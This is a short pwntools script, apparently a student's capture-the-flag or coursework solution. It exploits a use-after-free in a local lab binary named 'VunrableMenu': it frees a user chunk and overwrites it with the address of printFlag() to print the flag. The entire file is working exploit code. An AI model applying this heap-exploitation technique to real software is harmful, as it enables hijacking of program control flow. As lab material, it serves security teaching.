#    joshua kasten-lee 20164847

from pwn import *


def start(argv=[], *a, **kw):
    return process([exe] + argv, *a, **kw)

# c filename
exe = './VunrableMenu'


io = start()

# making the user
io.sendlineafter(b'(q) quit', b'M')
io.sendlineafter(b':', b'name')

#  put address of "printFlag()" function here
flagAddress = int("0x08049296", 16)  


# free the chunk storing the user
io.sendlineafter(b'(q) quit', b'D')
io.sendlineafter(b'?', b'Y')

# this is where you leave the message in the freed chunk
io.sendlineafter(b'(q) quit', b'L')
io.sendlineafter(b':', flat(flagAddress))
print(flagAddress, flat(flagAddress))

# print the flag
print("the falg is: ", io.recvlines(2)[1].decode())


